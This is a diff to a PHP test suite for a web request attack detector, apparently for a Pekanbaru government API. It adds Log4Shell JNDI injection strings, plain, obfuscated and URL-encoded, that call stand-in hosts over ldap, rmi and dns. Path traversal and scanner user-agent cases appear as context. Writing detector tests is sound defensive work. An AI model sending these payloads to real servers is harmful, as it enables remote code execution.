@@ -39,6 +39,7 @@ function detectorLegitCases(): array
         'filename dengan --' => ['filename' => 'Surat -- 2026.pdf'],
         'filename dengan titik ganda' => ['filename' => 'Laporan..2026.pdf'],
         'referer normal' => ['referer' => 'https://superapp-api.pekanbaru.go.id/services'],
+        'template literal JS' => ['body' => 'const pesan = `Halo ${nama}, total ${total}`;'],
         'query pencarian warga' => ['query' => 'search=laporan+masyarakat'],
     ];
 }
@@ -104,6 +105,13 @@ function detectorAttackCases(): array
         'double encoded traversal' => [['path-decoded' => '%2e%2e%2f%2e%2e%2fetc%2fpasswd'], false],
         'scanner sqlmap' => [['user_agent' => 'sqlmap/1.7.2#stable'], true],
         'scanner ZAP' => [['user_agent' => 'Mozilla/5.0 ZAP/2.14.0'], true],
+        'log4shell UA' => [['user_agent' => '${jndi:ldap://127.0.0.1:1389/a}'], true],
+        'log4shell UA uppercase' => [['user_agent' => '${JNDI:LDAPS://evil:1389/a}'], true],
+        'log4shell UA obfuscated' => [['user_agent' => '${${lower:j}ndi:ldap://evil/a}'], true],
+        'log4shell nested obfuscation' => [['body' => '${j${lower:n}di:dns://evil/a}'], true],
+        'log4shell query decoded' => [['query-decoded' => 'q=${jndi:rmi://evil/a}'], true],
+        'log4shell body' => [['body' => 'x=${jndi:ldaps://evil:1389/a}'], true],
+        'log4shell encoded query' => [['query' => 'q=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D'], true],
     ];
 }
 
